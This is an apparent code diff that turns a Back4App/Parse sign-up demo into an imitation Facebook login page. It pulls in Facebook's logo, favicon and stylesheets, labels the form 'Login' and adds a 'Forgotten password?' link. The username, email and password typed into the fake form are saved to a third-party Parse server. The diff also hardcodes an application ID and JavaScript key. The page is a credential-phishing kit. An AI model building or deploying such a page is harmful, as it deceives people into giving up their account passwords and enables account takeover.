@@ -1,13 +1,39 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8" />
-    <!-- This is the minified production version of parse js -->
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <script
       type="text/javascript"
       src="https://npmcdn.com/parse/dist/parse.min.js"
     ></script>
+    <script src="node_modules/parse/dist/parse.min.js"></script>
 
+<script>
+Parse.serverURL = 'https://parseapi.back4app.com'; // This is your Server URL
+// Remember to inform BOTH the Back4App Application ID AND the JavaScript KEY
+Parse.initialize(
+  'lm59RlqT6R3nKbuQEkf9OtoBxz8sB2XnbMYsoYKb', // This is your Application ID
+  'saiHkSrLOlUvI25pF6DV3nteoL9F1HPZVFlBxKqE' // This is your Javascript key
+);
+</script>
+
+    <title>Facebook</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+        <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
+        <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+        <meta name="theme-color" content="#3b5998">
+        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/l/0,cross/tfS_mimgxqq.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="CyaXmjS" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/YPUDk0mNWxe.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="dT5WZpo" crossorigin="anonymous">
+       
+
+    <link rel="stylesheet" href="css/style.css">
     <style type="text/css">
         * {
     padding: 0;
@@ -46,8 +72,6 @@ footer {
 }
 
 .col-logo {
-    flex: 0 0 50%;
-    text-align: left;
 }
 
 .col-form {
@@ -56,7 +80,7 @@ footer {
 }
 
 .col-logo img {
-    max-width: 300px;
+    font-size: 20px;
 }
 
 .col-logo h2 {
@@ -193,27 +217,28 @@ footer small {
     </style>
 </head>
 
-
-  </head>
-  <body>
-    <main>
+<body>  
+  <main>
         <div class="row">
             <div class="col-logo">
                 <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
-                <h2>Facebook helps you connect and share with the people in your life.</h2>
-            </div>
             <div class="col-form">
-                <div class="form-container">
-                  <input id="username" type="text" placeholder="Username" />
-    <input id="email" type="email" placeholder="Email" />
-    <input id="password" type="password" placeholder="Password" />
-    <button id="createButton">Create User</button>
- </div>
-                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+            <div class="form-container">
+        <form method="post">
+    <input id="username" type="text" placeholder="Username" /><br>
+    <input id="email" type="email" placeholder="Email" /><br>
+    <input id="password" type="password" placeholder="Password" /><br>
+    <button class="btn-login" id="createButton">Login</button> 
+    <a href="#">Forgotten password?</a>        
+    <button class="btn-new">Create new Account</button>
+
+</div> 
+                  </div>
             </div>
         </div>
     </main>
-     <footer>
+
+                  <footer>
         <div class="footer-contents">
             <ol>
                 <li>English (UK)</li>
@@ -273,12 +298,15 @@ footer small {
             <small>Facebook © 2022</small>
         </div>
     </footer>
+
   </body>
   <script>
-    // Initialize Parse
-    Parse.initialize("YOUR_PARSE_APP_ID", "YOUR_PARSE_JS_KEY"); //PASTE HERE YOUR Back4App APPLICATION ID AND YOUR JavaScript KEY
-    Parse.serverURL = "https://parseapi.back4app.com/";
-
+    Parse.serverURL = 'https://parseapi.back4app.com'; // This is your Server URL
+// Remember to inform BOTH the Back4App Application ID AND the JavaScript KEY
+Parse.initialize(
+  'lm59RlqT6R3nKbuQEkf9OtoBxz8sB2XnbMYsoYKb', // This is your Application ID
+  'saiHkSrLOlUvI25pF6DV3nteoL9F1HPZVFlBxKqE' // This is your Javascript key
+);
     // Create a new User
     async function createParseUser() {
       // Creates a new Parse "User" object, which is created by default in your Parse app
@@ -308,4 +336,6 @@ footer small {
       createParseUser();
     });
   </script>
+</html>
+
 </html>
